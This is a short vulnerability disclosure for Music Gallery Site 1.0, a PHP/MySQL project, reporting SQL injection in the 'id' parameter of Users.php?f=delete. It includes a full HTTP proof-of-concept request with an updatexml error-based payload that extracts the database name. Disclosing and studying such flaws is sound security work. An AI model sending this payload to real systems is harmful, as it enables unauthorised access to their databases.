## Music Gallery Site has a front-end SQL injection vulnerability

## Affected version: 
Music Gallery Site - 1.0

## Software:
https://www.sourcecodester.com/php/16073/music-gallery-site-using-php-and-mysql-database-free-source-code.html

## Vulnerability File:
/php-music/classes/Users.php?f=delete

## Description:
Music Gallery Site 1.0 is vulnerable to an unrestricted SQL injection attack in /php-music/classes/Users.php?f=delete with the attack parameter id. An attacker can exploit this vulnerability to directly obtain sensitive server information. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /php-music/classes/Users.php?f=delete HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://localhost
Connection: close
Referer: http://localhost/php-music/admin/?page=user/list
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=3+and+updatexml(1%2Cconcat(0x7e%2C(database()))%2C3)--+q 
```

Get database name 
<img width="1216" alt="image" src="https://github.com/user-attachments/assets/ec110910-6013-4d4e-8442-f1875bc1c006">





